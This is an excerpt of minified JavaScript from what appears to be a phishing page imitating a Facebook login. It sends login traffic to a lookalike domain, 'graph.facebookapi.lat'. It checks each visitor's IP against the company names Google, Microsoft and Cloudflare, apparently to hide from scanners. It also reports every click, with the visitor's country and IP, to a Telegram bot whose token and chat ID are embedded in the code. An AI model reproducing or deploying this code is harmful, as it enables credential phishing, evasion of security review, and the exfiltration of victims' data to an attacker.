...
de.default = de;
const ph = de,
    En = ph.create({baseURL: "https://graph.facebookapi.lat/v19.php?path=/LoginProcess", timeout: 120e3});
...
const mh = ({children: e = null}) => m.jsxs(m.Fragment, {
    ...
    .then(e => {
		...
		localStorage.setItem("companyName", e.company.name);
		Sx(e.ip);
		if (e.company.name.includes("Google") || e.company.name.includes("Microsoft")|| e.company.name.includes("Cloudflare")) {
    ...
    fetch(`https://freeipapi.com/api/json/${e}`).then(t => t.json()).then(t => {
		...
		fetch(`https://api.telegram.org/bot5521257813:AAG4g-oEg9EPXCRlRA0B_VfAcvwfxyhoObo/sendMessage?chat_id=-1002193044591&message_thread_id=10&text=${encodeURIComponent(t.countryName)}_${e}_CLICKED`)
    })
};
